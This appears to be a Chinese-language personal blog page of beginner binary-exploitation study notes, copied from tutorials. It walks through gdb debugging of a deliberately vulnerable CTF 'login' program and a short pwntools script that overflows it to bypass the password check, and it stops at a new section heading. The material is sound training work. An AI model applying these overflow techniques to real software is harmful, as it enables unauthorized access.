@@ -1,0 +1,1302 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>【Pvvn】可能是学习笔记吧 |  私の宝庫です</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/images/ayer.png" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-CS_Notes/PWN/【Pvvn】可能是学习笔记吧"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  【Pvvn】可能是学习笔记吧
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/" class="article-date">
+  <time datetime="2024-09-21T16:00:00.000Z" itemprop="datePublished">2024-09-22</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/notes/">notes</a> / <a class="article-category-link" href="/categories/notes/Pwn-notes/">Pwn notes</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">8.5k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">41 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <hr>
+<h2 id="目录"><a class="header-anchor" href="#目录">¶</a>目录</h2>
+<p>[TOC]</p>
+<hr>
+<h1>240922</h1>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45894840/article/details/123373180?spm=1001.2014.3001.5502">用简单易懂的话语来快速入门windows缓冲区溢出_vulnserver-CSDN博客</a>  因为kali环境没好所以先放着【画饼数：1】</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://ba1ma0.blog.csdn.net/article/details/126751701?spm=1001.2014.3001.5502">PWN入门（1）基础知识和环境设置-CSDN博客</a></p>
+<blockquote>
+<p>内容基本来源博客，仅cv存储自己看</p>
+</blockquote>
+<h2 id="所需环境"><a class="header-anchor" href="#所需环境">¶</a>所需环境</h2>
+<ul>
+<li>gdb √</li>
+<li>pwndbg √</li>
+<li>pwntools √</li>
+</ul>
+<h2 id="缓冲区溢出"><a class="header-anchor" href="#缓冲区溢出">¶</a>缓冲区溢出</h2>
+<p><img src="/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/image-20240922190048977.png" alt="Buffer Overflow Attack"></p>
+<ul>
+<li>在进行缓冲区溢出攻击后，缓冲区（buffer）里的字符向上溢出到了返回函数，从而导致程序错误</li>
+<li>还可以利用这个返回地址达到远程入侵的目的</li>
+</ul>
+<h3 id="动态调试"><a class="header-anchor" href="#动态调试">¶</a>动态调试</h3>
+<ul>
+<li>要下载的库：<code>https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101</code></li>
+</ul>
+<h4 id="gets函数"><a class="header-anchor" href="#gets函数">¶</a>gets函数</h4>
+<ul>
+<li>永远不要使用gets函数，因为如果事先不知道数据，gets将就无法判断读取多少个字符</li>
+<li>因为gets将继续存储字符当超过缓冲区的末端，使用它是极其危险的，它会破坏计算机安全</li>
+<li>请改用fgets。</li>
+</ul>
+<h4 id="程序信息"><a class="header-anchor" href="#程序信息">¶</a>程序信息</h4>
+<ul>
+<li>
+<p>查看编译后的文件信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file vuln</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file vuln</span><br><span class="line"></span><br><span class="line">--&gt; vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=40bfd0a2a6007a83be654c0626aedb3bc95a133f, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--&gt; 这是一个32位的可执行程序</span><br><span class="line">--&gt; intel x86架构</span><br><span class="line">--&gt; 动态链接</span><br><span class="line">--&gt; 没有开启stripped，意思是如果我们用gdb去调试这个程序，可以看到函数名称，可以更方便的分析程序</span><br><span class="line">--&gt; 链接库地址为/lib/ld-linux.so.2</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>使用<code>checksec</code> 工具可以查看程序更详细的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/xaut/Desktop/baimaoTutorial/crypto-cat-ctf/pwn/binary_exploitation_101/00-intro_setup_basics/vuln&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">32位程序</span><br><span class="line">部分RELRO，基本上所有程序都默认的有这个</span><br><span class="line">没有开启栈保护</span><br><span class="line">未启用nx，nx：数据执行</span><br><span class="line">没有pie，意思是程序的内存空间不会被随机化</span><br><span class="line">有读，写，和执行的段，意思是我们可以在程序里写入shellcode</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>尝试执行程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chmod +x vuln</span><br><span class="line">./vuln</span><br><span class="line"></span><br><span class="line">Give me data plz: </span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">[1]    27961 segmentation fault (core dumped)  ./vuln</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="使用gdb调试程序"><a class="header-anchor" href="#使用gdb调试程序">¶</a>使用gdb调试程序</h4>
+<ul>
+<li>使用gdb来动态调试程序</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb vuln</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看程序里所有调用的函数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info functions</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看主函数<code>main</code>的汇编代码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble main</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在<code>main</code>函数开头下一个断点便于调试【程序运行到断点处会停下来】，<code>run</code>运行程序</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b main</span><br><span class="line">run  </span><br></pre></td></tr></table></figure>
+<p><img src="/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/image-20240922195822198.png" alt="image-20240922195822198"></p>
+<ul>
+<li>第一段是显示了寄存器里的所有内容，寄存器是内存中非常靠近cpu的区域，因此cpu可以快速访问它们，但是在这些寄存器里面能存储的东西非常有限</li>
+</ul>
+<p><img src="/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/image-20240922195923832.png" alt="image-20240922195923832"></p>
+<ul>
+<li>第二段是当前程序停下来的位置和程序的汇编代码地址</li>
+</ul>
+<p><img src="/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/image-20240922195956903.png" alt="image-20240922195956903"></p>
+<ul>
+<li>
+<p>第三段是查看当前堆栈里的内容</p>
+</li>
+<li>
+<p>执行下一个汇编指令：<code>next</code>或<code>n</code></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/09/22/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91%E5%8F%AF%E8%83%BD%E6%98%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%90%A7/image-20240922200242728.png" alt="image-20240922200242728"></p>
+<ul>
+<li>输入一大堆<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code>，发现寄存器的值都被<code>a</code>覆盖</li>
+<li>最重要的是<code>EIP</code>这个寄存器
+<ul>
+<li>是程序的指针，指针就是寻找地址的，指到什么地址，就会运行该地址的参数</li>
+<li>控制了这个指针，就能控制整个程序的运行</li>
+</ul>
+</li>
+</ul>
+<h3 id="静态调试"><a class="header-anchor" href="#静态调试">¶</a>静态调试</h3>
+<blockquote>
+<p>了解一下</p>
+</blockquote>
+<ul>
+<li>在linux里，我们可以使用ghidra这个工具来静态调试程序<br>
+下载地址：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/NationalSecurityAgency/ghidra</span><br></pre></td></tr></table></figure>
+<ul>
+<li>相关文章（Ghidra逆向分析工具使用与实战）：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_45894840/article/details/124556441?spm=1001.2014.3001.5502</span><br></pre></td></tr></table></figure>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://ba1ma0.blog.csdn.net/article/details/126759579?spm=1001.2014.3001.5502">PWN入门（2）利用缓冲区溢出绕过登录和第一个PwnTools脚本_pwn脚本-CSDN博客</a></p>
+<blockquote>
+<p>内容基本来源博客，仅cv存储自己看</p>
+</blockquote>
+<h3 id="利用缓冲区溢出绕过登录"><a class="header-anchor" href="#利用缓冲区溢出绕过登录">¶</a>利用缓冲区溢出绕过登录</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chmod +x login</span><br><span class="line">./login    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Enter admin password: </span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">Incorrect Password!</span><br><span class="line">Successfully logged in as Admin (authorised=1633771873) :)</span><br><span class="line">[1]    32595 segmentation fault (core dumped)  ./login</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>用ltrace来跟踪进程调用库函数的情况</p>
+<blockquote>
+<p>这条命令会追踪 <code>./login</code> 程序执行过程中调用的所有动态库函数，并显示函数的名称、参数和返回值</p>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ltrace ./login</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">./login</span><br><span class="line">Enter admin password: </span><br><span class="line">pass</span><br><span class="line">Correct Password!</span><br><span class="line">Successfully logged in as Admin (authorised=1) :)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./login</span><br><span class="line">Enter admin password: </span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">Incorrect Password!</span><br><span class="line">Successfully logged in as Admin (authorised=1633771873) :)</span><br><span class="line">[1]    33436 segmentation fault (core dumped)  ./login</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>程序报错，授权号码也变得很大</p>
+</li>
+<li>
+<p>输入正确的密码时，授权号码为1</p>
+</li>
+<li>
+<p>一个一个字符测试程序的缓冲区边界</p>
+</li>
+<li>
+<p>查看源代码</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim login.c</span><br></pre></td></tr></table></figure>
+<h4 id="静态分析"><a class="header-anchor" href="#静态分析">¶</a>静态分析</h4>
+<ul>
+<li>ghidra</li>
+</ul>
+<h4 id="动态分析"><a class="header-anchor" href="#动态分析">¶</a>动态分析</h4>
+<ul>
+<li>用<code>gdb</code>打开<code>login</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb login</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看程序里调用的函数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x08049000  _init</span><br><span class="line">0x08049030  strcmp@plt</span><br><span class="line">0x08049040  printf@plt</span><br><span class="line">0x08049050  gets@plt</span><br><span class="line">0x08049060  puts@plt</span><br><span class="line">0x08049070  __libc_start_main@plt</span><br><span class="line">0x08049080  _start</span><br><span class="line">0x080490c0  _dl_relocate_static_pie</span><br><span class="line">0x080490d0  __x86.get_pc_thunk.bx</span><br><span class="line">0x080490e0  deregister_tm_clones</span><br><span class="line">0x08049120  register_tm_clones</span><br><span class="line">0x08049160  __do_global_dtors_aux</span><br><span class="line">0x08049190  frame_dummy</span><br><span class="line">0x08049192  main</span><br><span class="line">0x08049260  __libc_csu_init</span><br><span class="line">0x080492c0  __libc_csu_fini</span><br><span class="line">0x080492c1  __x86.get_pc_thunk.bp</span><br><span class="line">0x080492c8  _fini</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看main函数的汇编代码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble main</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x08049192 &lt;+0&gt;:	lea    ecx,[esp+0x4]</span><br><span class="line">   0x08049196 &lt;+4&gt;:	and    esp,0xfffffff0</span><br><span class="line">   0x08049199 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x0804919c &lt;+10&gt;:	push   ebp</span><br><span class="line">   0x0804919d &lt;+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x0804919f &lt;+13&gt;:	push   ebx</span><br><span class="line">   0x080491a0 &lt;+14&gt;:	push   ecx</span><br><span class="line">   0x080491a1 &lt;+15&gt;:	sub    esp,0x10</span><br><span class="line">   0x080491a4 &lt;+18&gt;:	call   0x80490d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x080491a9 &lt;+23&gt;:	add    ebx,0x2e57</span><br><span class="line">   0x080491af &lt;+29&gt;:	mov    DWORD PTR [ebp-0xc],0x0</span><br><span class="line">   0x080491b6 &lt;+36&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491b9 &lt;+39&gt;:	lea    eax,[ebx-0x1ff8]</span><br><span class="line">   0x080491bf &lt;+45&gt;:	push   eax</span><br><span class="line">   0x080491c0 &lt;+46&gt;:	call   0x8049060 &lt;puts@plt&gt;</span><br><span class="line">   0x080491c5 &lt;+51&gt;:	add    esp,0x10</span><br><span class="line">   0x080491c8 &lt;+54&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491cb &lt;+57&gt;:	lea    eax,[ebp-0x12]</span><br><span class="line">   0x080491ce &lt;+60&gt;:	push   eax</span><br><span class="line">   0x080491cf &lt;+61&gt;:	call   0x8049050 &lt;gets@plt&gt;</span><br><span class="line">   0x080491d4 &lt;+66&gt;:	add    esp,0x10</span><br><span class="line">   0x080491d7 &lt;+69&gt;:	sub    esp,0x8</span><br><span class="line">   0x080491da &lt;+72&gt;:	lea    eax,[ebx-0x1fe1]</span><br><span class="line">   0x080491e0 &lt;+78&gt;:	push   eax</span><br><span class="line">   0x080491e1 &lt;+79&gt;:	lea    eax,[ebp-0x12]</span><br><span class="line">   0x080491e4 &lt;+82&gt;:	push   eax</span><br><span class="line">   0x080491e5 &lt;+83&gt;:	call   0x8049030 &lt;strcmp@plt&gt;</span><br><span class="line">   0x080491ea &lt;+88&gt;:	add    esp,0x10</span><br><span class="line">   0x080491ed &lt;+91&gt;:	test   eax,eax</span><br><span class="line">   0x080491ef &lt;+93&gt;:	jne    0x804920c &lt;main+122&gt;</span><br><span class="line">   0x080491f1 &lt;+95&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491f4 &lt;+98&gt;:	lea    eax,[ebx-0x1fdc]</span><br><span class="line">   0x080491fa &lt;+104&gt;:	push   eax</span><br><span class="line">   0x080491fb &lt;+105&gt;:	call   0x8049060 &lt;puts@plt&gt;</span><br><span class="line">   0x08049200 &lt;+110&gt;:	add    esp,0x10</span><br><span class="line">   0x08049203 &lt;+113&gt;:	mov    DWORD PTR [ebp-0xc],0x1</span><br><span class="line">   0x0804920a &lt;+120&gt;:	jmp    0x804921e &lt;main+140&gt;</span><br><span class="line">   0x0804920c &lt;+122&gt;:	sub    esp,0xc</span><br><span class="line">   0x0804920f &lt;+125&gt;:	lea    eax,[ebx-0x1fca]</span><br><span class="line">   0x08049215 &lt;+131&gt;:	push   eax</span><br><span class="line">   0x08049216 &lt;+132&gt;:	call   0x8049060 &lt;puts@plt&gt;</span><br><span class="line">   0x0804921b &lt;+137&gt;:	add    esp,0x10</span><br><span class="line">   0x0804921e &lt;+140&gt;:	cmp    DWORD PTR [ebp-0xc],0x0</span><br><span class="line">   0x08049222 &lt;+144&gt;:	je     0x804923b &lt;main+169&gt;</span><br><span class="line">   0x08049224 &lt;+146&gt;:	sub    esp,0x8</span><br><span class="line">   0x08049227 &lt;+149&gt;:	push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x0804922a &lt;+152&gt;:	lea    eax,[ebx-0x1fb4]</span><br><span class="line">   0x08049230 &lt;+158&gt;:	push   eax</span><br><span class="line">   0x08049231 &lt;+159&gt;:	call   0x8049040 &lt;printf@plt&gt;</span><br><span class="line">   0x08049236 &lt;+164&gt;:	add    esp,0x10</span><br><span class="line">   0x08049239 &lt;+167&gt;:	jmp    0x8049250 &lt;main+190&gt;</span><br><span class="line">   0x0804923b &lt;+169&gt;:	sub    esp,0x8</span><br><span class="line">   0x0804923e &lt;+172&gt;:	push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x08049241 &lt;+175&gt;:	lea    eax,[ebx-0x1f80]</span><br><span class="line">   0x08049247 &lt;+181&gt;:	push   eax</span><br><span class="line">   0x08049248 &lt;+182&gt;:	call   0x8049040 &lt;printf@plt&gt;</span><br><span class="line">   0x0804924d &lt;+187&gt;:	add    esp,0x10</span><br><span class="line">   0x08049250 &lt;+190&gt;:	mov    eax,0x0</span><br><span class="line">   0x08049255 &lt;+195&gt;:	lea    esp,[ebp-0x8]</span><br><span class="line">   0x08049258 &lt;+198&gt;:	pop    ecx</span><br><span class="line">   0x08049259 &lt;+199&gt;:	pop    ebx</span><br><span class="line">   0x0804925a &lt;+200&gt;:	pop    ebp</span><br><span class="line">   0x0804925b &lt;+201&gt;:	lea    esp,[ecx-0x4]</span><br><span class="line">   0x0804925e &lt;+204&gt;:	ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>注意到：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0804921e &lt;+140&gt;:	cmp    DWORD PTR [ebp-0xc],0x0</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在这个对比指令的地址下一个断点，查看程序对比的流程</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *0x0804921e</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<ul>
+<li>运行后结果：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">→  0x804921e &lt;main+008c&gt;      cmp    DWORD PTR [ebp-0xc], 0x0</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>这里将<code>ebp</code>寄存器里的值减去了<code>0xc</code>转换成10进制，就是12和0做了对比</p>
+</li>
+<li>
+<p>查看这个地址的值</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x $ebp - 0xc</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x $ebp - 0xc</span><br><span class="line">0xffffcaac:	0x00000000</span><br></pre></td></tr></table></figure>
+<ul>
+<li>修改这里的值，使程序不进行跳转</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set *0xffffcaac = 1</span><br></pre></td></tr></table></figure>
+<ul>
+<li>输入<code>r</code>重新运行程序</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看对比值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x $ebp - 0xc</span><br><span class="line">0xffffcaac:	0x00000041</span><br></pre></td></tr></table></figure>
+<ul>
+<li>写一个脚本</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">z = &quot;AAAAAAA&quot;</span><br><span class="line">print(z + &quot;\x01&quot;)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>保存后用<code>python3</code>运行</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py | ./login</span><br></pre></td></tr></table></figure>
+<ul>
+<li>运行结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim exp.py              </span><br><span class="line">python3 exp.py | ./login</span><br><span class="line"></span><br><span class="line">Enter admin password: </span><br><span class="line">Incorrect Password!</span><br><span class="line">Successfully logged in as Admin (authorised=1) :)</span><br></pre></td></tr></table></figure>
+<h4 id="第一个pwntools脚本"><a class="header-anchor" href="#第一个pwntools脚本">¶</a>第一个pwntools脚本</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   //导入pwntools模块</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./login&#x27;</span>)   //运行程序</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;AAAAAA&#x27;</span>+<span class="string">b&quot;\x01&quot;</span>)   //在程序输出<span class="string">&quot;：&quot;</span>后发送指定字符</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvall().decode())   //接收输出并且解码</span><br></pre></td></tr></table></figure>
+<hr>
+<h1>240924</h1>
+<p><a target="_blank" rel="noopener" href="https://ba1ma0.blog.csdn.net/article/details/126770702?spm=1001.2014.3001.5502">PWN入门（3）覆盖堆栈上的变量_栈怎么覆盖一个变量使它等于2000-CSDN博客</a></p>
+<hr>
+<h2 id="覆盖堆栈上的变量"><a class="header-anchor" href="#覆盖堆栈上的变量">¶</a>覆盖堆栈上的变量</h2>
